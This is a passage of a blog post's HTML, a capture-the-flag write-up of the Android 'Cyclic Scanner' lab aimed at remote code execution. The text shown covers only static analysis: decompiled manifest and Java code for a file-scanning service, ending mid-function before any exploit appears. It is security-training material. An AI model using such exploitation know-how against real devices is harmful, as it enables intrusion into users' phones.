<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>MHL Cyclic Scanner | KS Blog</title>
<meta name="keywords" content="MHL, Android CTF">
<meta name="description" content="Challenge Description

Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.
cyclicscanner.apk

Solution
I started by performing static analysis to get an understanding on what the application is doing.
Static Analysis
I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.">
<meta name="author" content="">
<link rel="canonical" href="https://callmeks.github.io/posts/mhl-cyclic-scanner/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" integrity="sha256-1yREUm1&#43;y9sAFUOKf6iQVKZYv3WdBULi5d&#43;BzpS0k&#43;4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<link rel="icon" type="image/png" sizes="16x16" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=16">
<link rel="icon" type="image/png" sizes="32x32" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b?size=32">
<link rel="apple-touch-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<link rel="mask-icon" href="https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://callmeks.github.io/posts/mhl-cyclic-scanner/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:url" content="https://callmeks.github.io/posts/mhl-cyclic-scanner/">
  <meta property="og:site_name" content="KS Blog">
  <meta property="og:title" content="MHL Cyclic Scanner">
  <meta property="og:description" content="Challenge Description Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.
cyclicscanner.apk
Solution I started by performing static analysis to get an understanding on what the application is doing.
Static Analysis I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-03-30T12:42:08+08:00">
    <meta property="article:modified_time" content="2025-03-30T12:42:08+08:00">
    <meta property="article:tag" content="MHL">
    <meta property="article:tag" content="Android CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MHL Cyclic Scanner">
<meta name="twitter:description" content="Challenge Description

Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.
cyclicscanner.apk

Solution
I started by performing static analysis to get an understanding on what the application is doing.
Static Analysis
I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://callmeks.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "MHL Cyclic Scanner",
      "item": "https://callmeks.github.io/posts/mhl-cyclic-scanner/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "MHL Cyclic Scanner",
  "name": "MHL Cyclic Scanner",
  "description": "Challenge Description Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.\ncyclicscanner.apk\nSolution I started by performing static analysis to get an understanding on what the application is doing.\nStatic Analysis I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.\n",
  "keywords": [
    "MHL", "Android CTF"
  ],
  "articleBody": "Challenge Description Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.\ncyclicscanner.apk\nSolution I started by performing static analysis to get an understanding on what the application is doing.\nStatic Analysis I started out by looking into the AndroidManifest.xml after decompiling using jadx-gui.\n1 2 3 4 5 6 7 8 9 10 11 ",
  "wordCount" : "809",
  "inLanguage": "en",
  "datePublished": "2025-03-30T12:42:08+08:00",
  "dateModified": "2025-03-30T12:42:08+08:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://callmeks.github.io/posts/mhl-cyclic-scanner/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "KS Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://en.gravatar.com/avatar/9f3c6bb94301eda83e6a03211b184f6b"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://callmeks.github.io/" accesskey="h" title="KS Blog (Alt + H)">KS Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://callmeks.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="https://callmeks.github.io/about/" title="Whoami">
                    <span>Whoami</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://callmeks.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://callmeks.github.io/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      MHL Cyclic Scanner
    </h1>
    <div class="post-meta"><span title='2025-03-30 12:42:08 +0800 +08'>March 30, 2025</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;809 words

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#challenge-description">Challenge Description</a></li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#static-analysis">Static Analysis</a></li>
        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
      </ul>
    </li>
    <li><a href="#things-i-learned-from-this-challenge">Things I learned from this challenge</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-description">Challenge Description<a hidden class="anchor" aria-hidden="true" href="#challenge-description">#</a></h2>
<blockquote>
<p>Welcome to the Cyclic Scanner Challenge! This lab is designed to mimic real-world scenarios where vulnerabilities within Android services lead to exploitable situations. Participants will have the opportunity to exploit these vulnerabilities to achieve remote code execution (RCE) on an Android device.</p>
<p><a href="static/cyclicscanner.apk">cyclicscanner.apk</a></p>
</blockquote>
<h2 id="solution">Solution<a hidden class="anchor" aria-hidden="true" href="#solution">#</a></h2>
<p>I started by performing static analysis to get an understanding on what the application is doing.</p>
<h3 id="static-analysis">Static Analysis<a hidden class="anchor" aria-hidden="true" href="#static-analysis">#</a></h3>
<p>I started out by looking into the <code>AndroidManifest.xml</code> after decompiling using <code>jadx-gui</code>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-0-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-0-11">11</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;activity</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.mobilehackinglab.cyclicscanner.MainActivity&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;intent-filter&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.action.MAIN&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;category</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;android.intent.category.LAUNCHER&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/intent-filter&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/activity&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;service</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;com.mobilehackinglab.cyclicscanner.scanner.ScanService&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>I noticed that there&rsquo;s a service named <code>ScanService</code> and it is not exported. I started out by reading the <code>MainActivity</code> code.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-1-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-1-15">15</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setupSwitch$lambda$3</span>(MainActivity <span style="color:#66d9ef">this</span>$0, CompoundButton compoundButton, <span style="color:#66d9ef">boolean</span> isChecked) {
</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(<span style="color:#66d9ef">this</span>$0, <span style="color:#e6db74">&#34;this$0&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isChecked) {
</span></span><span style="display:flex;"><span>        Toast.<span style="color:#a6e22e">makeText</span>(<span style="color:#66d9ef">this</span>$0, <span style="color:#e6db74">&#34;Scan service started, your device will be scanned regularly.&#34;</span>, 0).<span style="color:#a6e22e">show</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>$0.<span style="color:#a6e22e">startForegroundService</span>(<span style="color:#66d9ef">new</span> Intent(<span style="color:#66d9ef">this</span>$0, (Class<span style="color:#f92672">&lt;?&gt;</span>) ScanService.<span style="color:#a6e22e">class</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    Toast.<span style="color:#a6e22e">makeText</span>(<span style="color:#66d9ef">this</span>$0, <span style="color:#e6db74">&#34;Scan service cannot be stopped, this is for your own safety!&#34;</span>, 0).<span style="color:#a6e22e">show</span>();
</span></span><span style="display:flex;"><span>    ActivityMainBinding activityMainBinding <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>$0.<span style="color:#a6e22e">binding</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (activityMainBinding <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        Intrinsics.<span style="color:#a6e22e">throwUninitializedPropertyAccessException</span>(<span style="color:#e6db74">&#34;binding&#34;</span>);
</span></span><span style="display:flex;"><span>        activityMainBinding <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    activityMainBinding.<span style="color:#a6e22e">serviceSwitch</span>.<span style="color:#a6e22e">setChecked</span>(<span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>According to this function in <code>MainActivity</code>, it will start <code>ScanService</code> service after some checks.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-1"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-1"> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-2"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-2"> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-3"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-3"> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-4"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-4"> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-5"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-5"> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-6"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-6"> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-7"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-7"> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-8"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-8"> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-9"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-9"> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-10"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-10">10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-11"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-11">11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-12"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-12">12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-13"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-13">13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-14"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-14">14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-15"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-15">15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-16"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-16">16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-17"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-17">17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-18"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-18">18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-19"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-19">19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-20"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-20">20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-21"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-21">21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-22"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-22">22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-23"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-23">23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f" id="hl-2-24"><a style="outline:none;text-decoration:none;color:inherit" href="#hl-2-24">24</a>
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// android.os.Handler</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">handleMessage</span>(Message msg) {
</span></span><span style="display:flex;"><span>    Intrinsics.<span style="color:#a6e22e">checkNotNullParameter</span>(msg, <span style="color:#e6db74">&#34;msg&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>((Object) <span style="color:#e6db74">&#34;starting file scan...&#34;</span>);
</span></span><span style="display:flex;"><span>        File externalStorageDirectory <span style="color:#f92672">=</span> Environment.<span style="color:#a6e22e">getExternalStorageDirectory</span>();
</span></span><span style="display:flex;"><span>        Intrinsics.<span style="color:#a6e22e">checkNotNullExpressionValue</span>(externalStorageDirectory, <span style="color:#e6db74">&#34;getExternalStorageDirectory(...)&#34;</span>);
</span></span><span style="display:flex;"><span>        Sequence $this$forEach$iv <span style="color:#f92672">=</span> FilesKt.<span style="color:#a6e22e">walk$default</span>(externalStorageDirectory, <span style="color:#66d9ef">null</span>, 1, <span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (Object element$iv : $this$forEach$iv) {
</span></span><span style="display:flex;"><span>            File file <span style="color:#f92672">=</span> (File) element$iv;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (file.<span style="color:#a6e22e">canRead</span>() <span style="color:#f92672">&amp;&amp;</span> file.<span style="color:#a6e22e">isFile</span>()) {
</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">print</span>((Object) (file.<span style="color:#a6e22e">getAbsolutePath</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;...&#34;</span>));
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">boolean</span> safe <span style="color:#f92672">=</span> ScanEngine.<span style="color:#a6e22e">INSTANCE</span>.<span style="color:#a6e22e">scanFile</span>(file);
</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>((Object) (safe <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;SAFE&#34;</span> : <span style="color:#e6db74">&#34;INFECTED&#34;</span>));
</span></span><span style="display:flex;"><span>            }
